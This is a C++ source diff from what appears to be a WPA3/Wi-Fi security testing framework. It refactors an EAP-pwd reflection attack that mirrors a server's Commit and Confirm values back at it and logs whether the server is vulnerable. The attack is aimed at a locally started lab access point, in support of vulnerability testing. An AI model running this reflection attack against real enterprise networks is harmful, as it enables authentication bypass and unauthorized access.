@@ -1,6 +1,8 @@
 #include <nlohmann/json.hpp>
 #include <tins/hw_address.h>
-#include "attacks/Enterprise/eap_pwd_reflection.h"
+
+#include "attacks/Enterprise/eap_defs.h"
+#include "attacks/Enterprise/eap_helper.h"
 #include "attacks/mc_mitm/MonitorSocket.h"
 #include "config/RunStatus.h"
 #include "logger/error_log.h"
@@ -10,23 +12,66 @@
 #include "system/utils.h"
 
 using namespace std;
+using namespace chrono;
 using namespace filesystem;
 using namespace Tins;
 
 namespace wpa3_tester::reflection{
 
+
+bool run_reflection_exchange(EAP_Att &eap_att){
+	if(!do_auth(eap_att))  return false;
+	if(!do_assoc(eap_att)) return false;
+
+	// poll for an EAPOL frame satisfying pred, or EAP-Success (returned as empty vector).
+	// returns nullopt on timeout or interrupt.
+
+	if(send_eap_normal_EAP(eap_att)) return false;
+	if(send_eap_normal_EAP_pwd_ID(eap_att)) return false;
+
+	// COMMIT
+	{
+		optional<EapPwdFrame> frame;
+		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t>& e){
+			const auto f = parse_eap_pwd(e);
+			if(f && f->opcode == eap::PWD_OPCODE_COMMIT){ frame = f; return true; }
+			return false;
+		});
+		if(!eapol){ log(LogLevel::WARNING, "EAP commit ended without success"); return false; }
+		//if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
+		log(LogLevel::INFO, "EAP-PWD-Commit Request – reflecting scalar+element");
+		send_eapol(eap_att, reflect_commit(*frame));
+	}
+
+	// CONFIRM
+	{
+		optional<EapPwdFrame> frame;
+		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t>& e){
+			const auto f = parse_eap_pwd(e);
+			if(f && f->opcode == eap::PWD_OPCODE_CONFIRM){ frame = f; return true; }
+			return false;
+		});
+		if(!eapol){ log(LogLevel::WARNING, "EAP confirm exchange ended without success"); return false; }
+		log(LogLevel::INFO, "EAP-PWD-Confirm Request – reflecting confirm value");
+		send_eapol(eap_att, reflect_confirm(*frame));
+	}
+
+	return eap_pwd_wait_for_success(eap_att);
+}
+
 void setup_attack(RunStatus &rs){
-	copy_file(rs.config_path().parent_path() / "config/hostapd.eap_user",
+	copy_f(rs.config_path().parent_path() / "config/hostapd.eap_user",
 			  rs.run_folder() / "hostapd.eap_user");
-	set_public_perms(rs.run_folder() / "hostapd.eap_user");
 
 	program::start(rs, "access_point");
-	rs.process_manager.wait_for("access_point", "AP-ENABLED", chrono::seconds(40));
+	rs.process_manager.wait_for("access_point", "AP-ENABLED", seconds(40));
 	log(LogLevel::INFO, "access_point running");
 	ip::set_ip(rs, "access_point");
+
 }
 
 void run_attack(RunStatus &rs){
+	rs.start_observers();
 	const auto &att_cfg  = rs.config().at("attack_config");
 	const auto attacker  = rs.get_actor("attacker");
 	const auto ap_actor  = rs.get_actor("access_point");
@@ -36,21 +81,24 @@ void run_attack(RunStatus &rs){
 	const string ssid       = ap_actor->get(SK::ssid);
 	const Channel channel   = ap_actor->get_channel();
 
-	const HWAddress<6> our_mac(attacker["mac"]);
-	const HWAddress<6> ap_mac(ap_actor["mac"]);
+	const HWAddress<6> our_mac(attacker.get(SK::mac));
+	const HWAddress<6> ap_mac(ap_actor.get(SK::mac));
 
-	MonitorSocket sock(iface);
+	MonitorSocket sock(iface, attacker.get(SK::netns)); // attacker need to be in netns
+	EAP_Att eap_att{
+		sock,
+		channel,
+		our_mac,
+		ap_mac,
+		ssid,
+		identity,
+		milliseconds{30000} // 30s
+	};
+	this_thread::sleep_for(seconds(3)); //FIXME needed for tshark setup?
+	const bool vulnerable = run_reflection_exchange(eap_att);
 
-	const bool vulnerable = run_reflection_exchange(
-		sock, channel, our_mac, ap_mac, ssid, identity, chrono::seconds(30));
-
-	nlohmann::json j;
-	j["passed"]     = vulnerable;
-	rs.save_result(j);
-
+	rs.save_result({{"passed", vulnerable}});
 	log(LogLevel::INFO, "Reflection attack result: {}", vulnerable ? "VULNERABLE" : "not vulnerable");
 }
 
-/*void stats(const RunStatus& rs){
-}*/
 }
